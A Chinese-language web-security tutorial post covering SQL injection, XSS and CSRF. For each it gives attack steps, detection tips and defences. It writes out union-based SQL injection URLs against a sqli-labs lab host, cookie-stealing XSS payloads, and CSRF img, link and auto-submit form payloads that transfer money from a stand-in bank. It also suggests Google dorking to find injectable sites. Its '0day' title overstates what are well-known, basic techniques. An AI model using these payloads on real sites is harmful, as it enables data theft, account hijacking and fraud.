#  web 0day 大全（一）   
原创 零漏安全  零漏安全   2024-06-22 10:02  
  
SQL注入  
  
1.发生方式  
  
通过将恶意的DQL或者DML语句添加到应用的输入参数中，经过后端代码拼接成语句，再在后台数据库服务器上解析执行进行的攻击  
  
1.1典型案例  
```
布尔盲注
时间盲注
报错盲注
联合查询
```  
  
1.2攻击方式  
```
1、判断是否存在注入点（只要有变化就可能存在）
http://192.168.13.100/sqlilabs/Less-1/?id=1
http://192.168.13.100/sqli-labs/Less-1/?id=1' and 1=1 --+
2、判断字段数量
http://192.168.13.100/sqli-labs/Less-1/?id=1'order by 4 --+
3、使用联合查询，判断回显点
http://192.168.13.100/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+
4、查询版本号和数据库名称
http://192.168.13.100/sqli-labs/Less-1/?id=-1' union select 1,database(),version() --+
5、获得数据库中的表名
http://192.168.13.100/sqli-labs/Less-1/?id=-1'union select1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
6、获得字段名
http://192.168.13.100/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users'--+
```  
  
1.3检测思路  
```
1、使用谷歌语法搜集符合格式的URL，比如inurl:index.php?id=1
2、使用SQLmap工具
3、手动注入，输入 ' 或者 ' or 1=1
```  
  
1.4防御措施  
```
1、对用户进行分级管理，严格控制用户的权限
2、程序员在书写SQL语言时，禁止将变量直接写入到SQL语句，必须通过设置相应的参数来传递相关的变量
3、SQL语句预编译
4、基础过滤和二次过滤（WAF）
5、数据库信息加密：对称、非对称、不可逆
```  
  
xss跨站脚本攻击  
  
2.1发生方式  
  
利用GET参数或者输入框、留言框等，插入一些恶意的代码，当用户访问地址、页面的时候现实攻击（分为：反射型、存储型）  
  
2.2典型案例  
```
1、GET请求（通常是构造钓鱼链接引发反射攻击）
2、留言板
3、搜索框
```  
  
2.3漏洞危害  
```
1、获取cookie，实现冒充身份的后续操作
2、刷点击
3、弹广告
4、传播蠕虫病毒
```  
  
2.4攻击方式  
```
1、<script>alert(1)</script>
2、<img src="" onerror="alert(1)">
3、<script>alert(document.cookie)</script>
4、><script>alert(document.cookie)</script>
注意：绕过方法有双写、利用HTML中的字符实体、大小写等等
payload可以百度
```  
  
2.5检测思路  
```
<script>alert('XSS')</script>、<img src=x onerror=alert('XSS')>、<iframe src="javascript:alert('XSS');"></iframe> ， 最基础的可以在输入点的参数中加入这些代码，查看页面的响应情况。
```  
  
2.6防御措施  
```
1、利用正则表达式对输入的内容进行识别、然后进行处理（入口）
2、使用htmlspecialchars函数对echo"";document.write();等输出的内容做实体化的处理（出口）
3、使用WAF：web application firewall
```  
  
CSRF跨站请求伪造  
  
3.1发生方式  
  
第三方网站利用当前网站生效的cookie，从而请求服务器的接口去进行攻击（如转账、修改用户信息等敏感接口）  
  
3.2典型案例  
```
GMali--->设置邮件转发（2007年）
微博--->自动关注账号
```  
  
3.3漏洞危害  
```
1、修改账户信息
2、利用管理员账号，上传木马文件
3、传播蠕虫病毒（点击、扩散、点击...）
4、和其他攻击手段配配合攻击（XSS、SQL注入）
```  
  
3.4攻击方式  
```
1、通过图片的img src属性，自动加载，发起get请求<imgsrc="http://superbank.com/bank/transfer.php?nameid=2002&amount1000"width="0"height="0">
2、构成一个超链接，用户点击以后，发起GET请求
<a href="http://superbank.com/transfer.php?amount=10008to=jiangang"taget=" blank">小姐姐在线视频聊天!!
<a/>
3、构建一个隐藏表单，用户访问，自动提交，发起POST请求
<form action="http://superbank.com/withdraw" method=POST>
 <input type="hidden" name="account"value="xiaoming"/>
 <input type="hidden"name="amount" value="1000"/>
 <input type="hidden" name="to" value="jiangang" />
</form>
<script> document.forms[0].submit(); </script>
```  
  
3.5检测思路  
```
1、使用BP的CSRF POC功能
2、工具CSRF Tester（半自动）
3、https://github.com/s0md3v/Bolt（全自动）
4、各种云产品，扫描检测（给钱就行）
```  
  
3.6防御措施  
```
1、使用Referer进行一个简单效验（但是Referer可以被修改）
2、使用token验证（不是100%安全）
<iframe src="../csrf" onload=alert(frames[0].document.getElementsByName('user token'[0].value)>
3、敏感接口调用的二次验证：验证码、短信、扫码、人脸识别等
4、不好奇、不乱点（使用者角度）
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9GGhFCliayOT8iadiczqGjFfrm3oZqGsnnLm8ssvfMO2kTknUKiavbVsDesPnr6lnFRPGXM3kyJy5d8wJViacAdmEyw/640?wx_fmt=png "")  
  
长按二维码识别关注  
  
  
